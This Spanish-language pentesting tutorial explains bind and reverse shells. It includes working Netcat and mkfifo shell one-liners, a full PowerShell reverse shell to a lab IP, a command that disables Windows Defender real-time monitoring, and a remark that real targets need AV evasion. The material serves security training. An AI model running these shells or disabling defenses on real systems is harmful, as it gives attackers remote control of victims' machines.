# Bind Shells y Reverse Shells

Existen dos grandes modelos para establecer una conexión de shell remota: **bind shell** (el objetivo escucha) y **reverse shell** (el objetivo conecta de vuelta). La elección entre uno y otro depende de la configuración del firewall y el entorno de red.

### Bind Shell

En una bind shell, el **sistema objetivo** inicia un listener en un puerto y el atacante se conecta a él.

<div data-with-frame="true"><figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

#### Problemas de las bind shells

* Debe existir ya un listener en el objetivo, o hay que encontrar la forma de iniciarlo
* Los firewalls de perímetro suelen bloquear conexiones entrantes no autorizadas
* El firewall del SO (Windows Defender, iptables) puede bloquear el puerto

#### Establecer una bind shell con Netcat

**En el objetivo (servidor):**

```bash
# Iniciar el listener
nc -lvnp 7777

# Bind shell completa — enlaza Bash al socket TCP
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.10.14.20 7777 > /tmp/f
```

Desglose del one-liner:

* `rm -f /tmp/f` — elimina el pipe si existe
* `mkfifo /tmp/f` — crea un named pipe FIFO
* `cat /tmp/f | /bin/bash -i 2>&1` — bash interactivo con stderr redirigido
* `nc -l 10.10.14.20 7777 > /tmp/f` — Netcat escucha y redirige al pipe

**En el atacante (cliente):**

```bash
nc -nv 10.10.14.20 7777
```

### Reverse Shell

En una reverse shell, el **atacante** tiene el listener y el **objetivo** inicia la conexión de vuelta.

<div data-with-frame="true"><figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure></div>

Es el método preferido en la práctica porque el tráfico **saliente** del objetivo raramente está tan restringido como el entrante. Los administradores suelen olvidarse de monitorizar conexiones salientes con la misma atención que las entrantes.

#### Reverse shell con Netcat en Linux

**En el atacante:**

```bash
sudo nc -lvnp 443
```

**En el objetivo:**

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.15 443 > /tmp/f
```

#### Reverse shell con PowerShell en Windows

**En el atacante:**

```bash
sudo nc -lvnp 443
```

**En el objetivo (cmd.exe o PowerShell):**

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Desglose del one-liner de PowerShell:

| Componente                                | Función                                                       |
| ----------------------------------------- | ------------------------------------------------------------- |
| `powershell -nop -c`                      | Ejecuta PowerShell sin perfil y con el comando entre comillas |
| `New-Object System.Net.Sockets.TCPClient` | Crea un socket TCP hacia el atacante                          |
| `$stream = $client.GetStream()`           | Establece el canal de comunicación                            |
| `[byte[]]$bytes = 0..65535`               | Buffer vacío de bytes para recibir datos                      |
| `$stream.Read(...)`                       | Lee los comandos enviados por el atacante                     |
| `iex $data`                               | Ejecuta los comandos recibidos (Invoke-Expression)            |
| `$sendback`                               | Captura el output del comando ejecutado                       |
| `$stream.Write(...)`                      | Envía el resultado de vuelta al atacante                      |

> Windows Defender detectará y bloqueará este one-liner. Para entornos de lab: `Set-MpPreference -DisableRealtimeMonitoring $true`. En entornos reales se necesita ofuscación o evasión de AV.

#### Usar puerto 443 para el listener

Usar puertos comunes (443, 80, 8443) para el listener reduce la probabilidad de ser bloqueado por el firewall, ya que el tráfico saliente hacia esos puertos raramente está restringido.

### Comparativa bind vs reverse

|                              | Bind Shell                       | Reverse Shell                      |
| ---------------------------- | -------------------------------- | ---------------------------------- |
| **Quién inicia la conexión** | Atacante                         | Objetivo                           |
| **Dónde está el listener**   | Objetivo                         | Atacante                           |
| **Problemas con firewall**   | Más fácil de bloquear (entrante) | Más difícil de bloquear (saliente) |
| **Necesita listener previo** | Sí                               | No                                 |
| **Uso en pentest real**      | Poco común                       | El estándar                        |

> **Reverse Shell Cheat Sheet** (`https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md`) contiene one-liners para docenas de lenguajes y sistemas. Es la referencia de referencia para reverse shells.
